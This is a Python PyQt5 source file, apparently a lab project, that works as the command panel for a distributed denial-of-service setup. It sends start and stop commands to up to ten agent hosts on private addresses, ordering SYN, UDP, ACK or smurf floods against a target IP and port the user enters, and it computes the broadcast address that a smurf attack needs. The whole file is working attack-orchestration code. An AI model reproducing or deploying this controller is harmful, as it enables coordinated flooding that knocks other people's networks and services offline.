from PyQt5 import QtWidgets, QtGui, QtCore

# 引用ui.py檔案中的物件 
from ui import Ui_MainWindow

import requests
import ipaddress


URL_1 = 'http://192.168.200.62:9999/'
URL_2 = 'http://192.168.126.132:9999/'
URL_3 = 'http://192.168.126.132:9999/'
URL_4 = 'http://192.168.126.132:9999/'
URL_5 = 'http://192.168.126.132:9999/'
URL_6 = 'http://192.168.126.132:9999/'
URL_7 = 'http://192.168.126.132:9999/'
URL_8 = 'http://192.168.126.132:9999/'
URL_9 = 'http://192.168.126.132:9999/'
URL_10 = 'http://192.168.126.132:9999/'


class MainWindow(QtWidgets.QMainWindow):

    def __init__(self):
        super().__init__() # in python3, super(Class, self).xxx = super().xxx
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)

    
        #下拉式選單物件、顯示的文字
        self.ui.comboBox.addItems(['1','2','3','4','5','6','7','8','9','10'])
        #控制端
        self.setup_control()
        
    def setup_control(self):
        self.ui.changelabel.setText('Attack Detail')
        
        #Attack按鈕的觸發事件buttonClicked
        self.ui.pushButton.clicked.connect(self.buttonClicked)
        
        #Stop按鈕的觸發事件button_2Clicked
        self.ui.pushButton_2.clicked.connect(self.button_2Clicked)
    
    #攻擊事件
    def buttonClicked(self):
        
        #下拉式選單對應的主機位址
        host = self.ui.comboBox.currentText()
        if host == '1': url = URL_1
        elif host == '2': url = URL_2
        elif host == '3': url = URL_3
        elif host == '4': url = URL_4
        elif host == '5': url = URL_5
        elif host == '6': url = URL_6
        elif host == '7': url = URL_7
        elif host == '8': url = URL_8
        elif host == '9': url = URL_9
        elif host == '10': url = URL_10
        
        # 攻擊目標的IP 
        IP = self.ui.lineEdit.text()
        
        # 攻擊目標的Port	
        port = self.ui.lineEdit_2.text()
        if port == "" : port = "80"
        
        # 攻擊目標的Broadcast address	
        BdstIP = ipaddress.ip_network( IP + "/24" , strict=False).broadcast_address
        
        # 根據下拉市式選單，填入post請求的data
        if self.ui.radioButton.isChecked():
            mode = 'S'
            my_data = {'attack':'tcp_attack', 'IP':IP, 'port':port,'mode':mode}
            data_detail = f"attack:syn_attack,IP:{IP},port:{port},mode:{mode}"
            
        if self.ui.radioButton_2.isChecked():
            my_data = {'attack':'udp_attack', 'IP':IP, 'port':port}
            data_detail = f"attack:udp_attack,IP:{IP},port:{port}"
            
        if self.ui.radioButton_3.isChecked():
            mode = 'A'
            my_data = {'attack':'tcp_attack', 'IP':IP, 'port':port,'mode':mode}
            data_detail = f"attack:ack_attack,IP:{IP},port:{port}"
            
        if self.ui.radioButton_4.isChecked():
            my_data = {'attack':'smurf_attack', 'IP':IP, 'port':port,'BdstIP':BdstIP}
            data_detail = f"attack:smurf_attack,IP:{IP},port:{port}"
            attack = "smurf_attack"
            
        start_url = url + 'start'
        
        #post請求的主機位址+請求內容(my_data)
        r = requests.post(start_url, data=my_data)
        
        #在界面上顯示攻擊的詳細資訊
        self.ui.changelabel.setText(f"{url} \n{data_detail}")
        
        #根據主機，填入相應欄位資訊
        if  host ==  '1':self.ui.lineEdit1.setText(f"{data_detail}")
        elif  host ==  '2':self.ui.lineEdit2.setText(f"{data_detail}")
        elif  host ==  '3':self.ui.lineEdit3.setText(f"{data_detail}")
        elif  host ==  '4':self.ui.lineEdit4.setText(f"{data_detail}")
        elif  host ==  '5':self.ui.lineEdit5.setText(f"{data_detail}")
        elif  host ==  '6':self.ui.lineEdit6.setText(f"{data_detail}")
        elif  host ==  '7':self.ui.lineEdit7.setText(f"{data_detail}")
        elif  host ==  '8':self.ui.lineEdit8.setText(f"{data_detail}")
        elif  host ==  '9':self.ui.lineEdit9.setText(f"{data_detail}")
        elif  host ==  '10':self.ui.lineEdit10.setText(f"{data_detail}")
            
    #停止主機攻擊事件	
    def button_2Clicked(self):
        #根據主機改變url,清除相應欄位
        host = self.ui.comboBox.currentText()
        if host == '1':
            url = URL_1
            self.ui.lineEdit1.clear()
        elif host == '2':
            url = URL_2
            self.ui.lineEdit2.clear()
        elif host == '3':
            url = URL_3
            self.ui.lineEdit3.clear()
        elif host == '4':
            url = URL_4
            self.ui.lineEdit4.clear()
        elif host == '5':
            url = URL_5
            self.ui.lineEdit5.clear()
        elif host == '6':
            url = URL_6
            self.ui.lineEdit6.clear()
        elif host == '7':
            url = URL_7
            self.ui.lineEdit7.clear()
        elif host == '8':
            url = URL_8
            self.ui.lineEdit8.clear()
        elif host == '9':
            url = URL_9
            self.ui.lineEdit9.clear()
        elif host == '10':
            url = URL_10
            self.ui.lineEdit10.clear()
            
        
        stop_url = url + 'stop'
        #對選定主機post stop請求
        r = requests.get(stop_url)
        #在界面上顯示停止攻擊
        self.ui.changelabel.setText("Stop")
       

if __name__ == '__main__' :
    import sys
    app = QtWidgets.QApplication(sys.argv)
    window =MainWindow()
    window.show()
    sys.exit(app.exec_())
